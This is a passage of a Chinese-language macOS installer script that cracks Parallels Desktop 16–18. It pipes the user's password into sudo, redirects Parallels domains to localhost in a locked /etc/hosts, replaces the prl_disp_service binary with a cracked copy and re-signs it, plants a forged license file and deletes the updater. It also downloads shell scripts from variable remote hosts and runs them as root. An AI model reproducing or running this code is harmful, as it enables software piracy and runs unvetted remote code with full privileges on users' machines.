	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.cn\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.de" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.de\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.es" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.es\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.fr" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.fr\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.nl" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.nl\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.pt" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.pt\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.ru" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.ru\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallelskorea.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallelskorea.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "reportus.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 reportus.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.cn" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.cn\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.de" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.de\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.es" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.es\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.fr" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.fr\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.nl" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.nl\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.pt" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.pt\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.ru" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.ru\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallelskorea.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallelskorea.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "pax-manager.myparallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 pax-manager.myparallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "myparallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 myparallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "my.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 my.parallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
do shell script "chflags uchg /etc/hosts" password "$pass" with administrator privileges
do shell script "chflags schg /etc/hosts" password "$pass" with administrator privileges
EOD
    else	
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 reportus.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 pax-manager.myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 my.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo chflags uchg /etc/hosts
    echo "$pass" | sudo -S sudo chflags schg /etc/hosts
    fi
   	fi
   	if [ "$dkzdqx" ]; then
   	if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Parallels Desktop 18/Parallels Desktop.app/Contents/MacOS/inittool' install -t '/Applications/Parallels Desktop.app' -s" password "$pass" with administrator privileges
EOD
else
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ 18/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
    fi
    else
    #open -W /Volumes/Parallels\ Desktop\ 18/Install.app
    #sleep 10 && killall -9 prl_client_app
curl -# -C - --connect-timeout 10 -o /tmp/azpd.zip "$osip/azpd.zip"
unzip -o "/tmp/azpd.zip" -d "/tmp" >/dev/null 2>&1
clear && printf "\e[3J"
echo
echo
echo
echo "\033[36m请点击【继续】安装程序\033[0m"		
echo
echo
echo
echo "\033[36m安装中的【提示】都点【好】\033[0m"	
echo
echo
echo
echo "\033[36m安装【完后】请点击【关闭】！\033[0m"	
echo
echo
echo
open -W /tmp/18.pkg
    fi
    PDFM_DISP_CRACK="/tmp/pd18sq/prl_disp_service"
    PDFM_DISP_DST="/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service.app/Contents/MacOS/prl_disp_service"
    PDFM_DISP_DSTT="/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service.app/Contents/MacOS"
    PDFM_DISP_ENT="/tmp/pd18sq/ParallelsService.entitlements"
    LICENSE_FILE="/tmp/pd18sq/licenses.json"
    LICENSE_DST="/Library/Preferences/Parallels/licenses.json"
    PDFM_DIR="/Applications/Parallels Desktop.app"
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_stop
    killall -9 prl_client_app 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_start
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" web-portal signout 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" --cep off 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" --allow-attach-screenshots off 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_stop
    if [ "$moderoot" ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/18.0.sh "$ip5/18.0.1.sh" >/dev/null 2>&1
osascript <<EOD
do shell script "bash /tmp/18.0.sh" password "$pass" with administrator privileges
do shell script "rm -rf /tmp/18.0.sh" password "$pass" with administrator privileges
EOD
    else
    if [ "$dkzdqx" ]; then
    echo "$pass" | sudo -S sudo cp -f "${PDFM_DISP_CRACK}" "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo chown root:wheel "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo chmod 755 "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo codesign -f -s - --timestamp=none --all-architectures --entitlements "${PDFM_DISP_ENT}" "${PDFM_DISP_DST}"
    else
    echo "$pass" | sudo -S sudo chown root:wheel "${PDFM_DISP_CRACK}"
    echo "$pass" | sudo -S sudo chmod 755 "${PDFM_DISP_CRACK}"
    echo "$pass" | sudo -S sudo codesign -f -s - --timestamp=none --all-architectures --entitlements "${PDFM_DISP_ENT}" "${PDFM_DISP_CRACK}"
    echo "$pass" | sudo -S sudo rm -f "${PDFM_DISP_DST}" > /dev/null
    echo "$pass" | sudo -S sudo cp -f "${PDFM_DISP_CRACK}" "${PDFM_DISP_DSTT}"
    fi
    echo "$pass" | sudo -S sudo rm -f "${LICENSE_DST}" > /dev/null
    echo "$pass" | sudo -S sudo cp "${LICENSE_FILE}" "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo chown root:wheel "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo chmod 444 "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app/Contents/MacOS/prl_updater_ctl
    echo "$pass" | sudo -S sudo rm -rf /tmp/pd18sq
    echo "$pass" | sudo -S sudo rm -rf /tmp/pd18sq.zip
    fi
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_start
    zhendock=$(defaults read com.apple.dock | grep Parallels%20Desktop.app)
    if [ ! "$zhendock" ]; then
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/Parallels Desktop.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    fi
    umount -f /Volumes/Parallels\ Desktop\ 18
    diskutil eject $(diskutil list | grep 'Parallels Desktop 18' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
    open /Applications/Parallels\ Desktop.app
    clear && printf "\e[3J"
    exit
    fi
 
 	if [ "$pd17sq" ]; then
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-17.1.2-51548.dmg ]; then
    clear
	echo
	echo ID: "\033[36m${tbid}\033[0m"		
    echo
	echo 正在安装虚拟机软件，请等待....
    hdiutil attach ~/Downloads/JG_Download/ParallelsDesktop-17.1.2-51548.dmg>/dev/null 2>&1
    killall PD\ Runner 2>/dev/null
	killall PD\ Partner 2>/dev/null
	killall PD_START 2>/dev/null
	killall prl_client_app >/dev/null 2>&1 	
	echo "$pass" | sudo -S sudo launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动Win系统.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Runner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Partner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Go.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PDST.app >/dev/null 2>&1	
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ 启动.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动虚拟机.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win10.prlnk >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win11.prlnk >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 10.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 7.app >/dev/null 2>&1
	echo
	echo 正在下载必要组件，请等待....
	curl -# -C - --connect-timeout 10 -o /tmp/pd17sq.zip --retry 8888 "$ip5/pd17sq.zip"
    unzip -o "/tmp/pd17sq.zip" -d "/tmp">/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep www.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 reportus.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 pax-manager.myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 my.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo chflags uchg /etc/hosts
    echo "$pass" | sudo -S sudo chflags schg /etc/hosts
   	fi
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ 17/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
    PDFM_DISP_CRACK="/tmp/pd17sq/prl_disp_service"
    PDFM_DISP_DST="/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service.app/Contents/MacOS/prl_disp_service"
    PDFM_DISP_ENT="/tmp/pd17sq/ParallelsService.entitlements"
    LICENSE_FILE="/tmp/pd17sq/licenses.json"
    LICENSE_DST="/Library/Preferences/Parallels/licenses.json"
    PDFM_DIR="/Applications/Parallels Desktop.app"
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_stop
    killall -9 prl_client_app 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_start
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" web-portal signout 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" --cep off 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/prlsrvctl" --allow-attach-screenshots off 2>/dev/null
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_stop
    echo "$pass" | sudo -S sudo cp -f "${PDFM_DISP_CRACK}" "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo chown root:wheel "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo chmod 755 "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo codesign -f -s - --timestamp=none --all-architectures --entitlements "${PDFM_DISP_ENT}" "${PDFM_DISP_DST}"
    echo "$pass" | sudo -S sudo rm -f "${LICENSE_DST}" > /dev/null
    echo "$pass" | sudo -S sudo cp "${LICENSE_FILE}" "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo chown root:wheel "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo chmod 444 "${LICENSE_DST}"
    echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app/Contents/MacOS/prl_updater_ctl
    echo "$pass" | sudo -S sudo rm -rf /tmp/pd17sq
    echo "$pass" | sudo -S sudo rm -rf /tmp/pd17sq.zip
    "${PDFM_DIR}/Contents/MacOS/Parallels Service" service_start
    zhendock=$(defaults read com.apple.dock | grep Parallels%20Desktop.app)
    if [ ! "$zhendock" ]; then
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/Parallels Desktop.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    fi
    umount -f /Volumes/Parallels\ Desktop\ 17
    diskutil eject $(diskutil list | grep 'Parallels Desktop 17' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
    open /Applications/Parallels\ Desktop.app
    clear && printf "\e[3J"
    exit
    fi

 	if [ "$pd16sq" ]; then
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16*.dmg ]; then
    clear
	echo
	echo ID: "\033[36m${tbid}\033[0m"		
    echo
	echo 正在安装虚拟机软件，请等待....
	if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.1-50696.dmg ]; then
    hdiutil attach ~/Downloads/JG_Download/ParallelsDesktop-16.5.1-50696.dmg >/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.1-50696.dmg ]; then
    hdiutil attach ~/Downloads/JG_Download/ParallelsDesktop-16.5.0-49183.dmg >/dev/null 2>&1
    fi
    killall PD\ Runner 2>/dev/null
	killall PD\ Partner 2>/dev/null
	killall PD_START 2>/dev/null
	killall prl_client_app >/dev/null 2>&1 	
	echo "$pass" | sudo -S sudo launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动Win系统.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Runner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Partner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Go.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PDST.app >/dev/null 2>&1	
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ 启动.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动虚拟机.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win10.prlnk >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win11.prlnk >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 10.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 7.app >/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep www.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 reportus.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 pax-manager.myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 myparallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 my.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo chflags uchg /etc/hosts
    echo "$pass" | sudo -S sudo chflags schg /etc/hosts
   	fi
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ 16/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.2-50703.dmg ]; then
curl -# -C - --connect-timeout 10 -o /tmp/16.5.sh --retry 8888 "$ip5/16.5.2.sh"
fi
if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.1-50696.dmg ]; then
curl -# -C - --connect-timeout 10 -o /tmp/16.5.sh --retry 8888 "$ip5/16.5.1.sh"
fi
if [ -f ~/Downloads/JG_Download/ParallelsDesktop-16.5.0-49183.dmg ]; then
curl -# -C - --connect-timeout 10 -o /tmp/16.5.sh --retry 8888 "$ip5/16.5.0.sh"
fi
echo "$pass" | sudo -S sudo bash /tmp/16.5.sh >/dev/null 2>&1
open -j -a "/Applications/Parallels Desktop.app"
sleep 3 && killall -9 prl_client_app
echo "$pass" | sudo -S sudo rm -rf /tmp/16.5.sh
    zhendock=$(defaults read com.apple.dock | grep Parallels%20Desktop.app)
    if [ ! "$zhendock" ]; then
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/Parallels Desktop.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    fi
    umount -f /Volumes/Parallels\ Desktop\ 16
    diskutil eject $(diskutil list | grep 'Parallels Desktop 16' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
    if [ -e /Applications/Windows\ 10.pvm ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 10.pvm  	
   	fi
   	if [ -e /Applications/Windows\ 11.pvm ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 11.pvm  	
   	fi
    clear && printf "\e[3J"
    exit
    fi
    
	if [ "$m1vm" ]; then
	echo
	echo ID: "\033[36m${tbid}\033[0m"		
    echo
	echo 正在安装中，请等待....
	hdiutil attach -passphrase "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" ~/Downloads/JG_Download/M1VM_323.dmg>/dev/null 2>&1
    cp -R /Volumes/M1VM/Windows10.vmwarevm /Applications
    rm -rf /Applications/Windows10.vmwarevm/Windows10.nvram
    curl -# -C - --connect-timeout 10 -o /tmp/M1VM.zip "$ip5/M1VM.zip">/dev/null 2>&1
    unzip -o "/tmp/M1VM.zip" -d "/tmp">/dev/null 2>&1
    cp /tmp/Windows10.nvram /Applications/Windows10.vmwarevm
    rm -rf /tmp/Windows10.nvram
    rm -rf /tmp/M1VM.zip
    hdiutil attach ~/Downloads/JG_Download/VMware-Fusion*.dmg>/dev/null 2>&1
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion\ Tech\ Preview.app /Applications
    echo >> /tmp/config
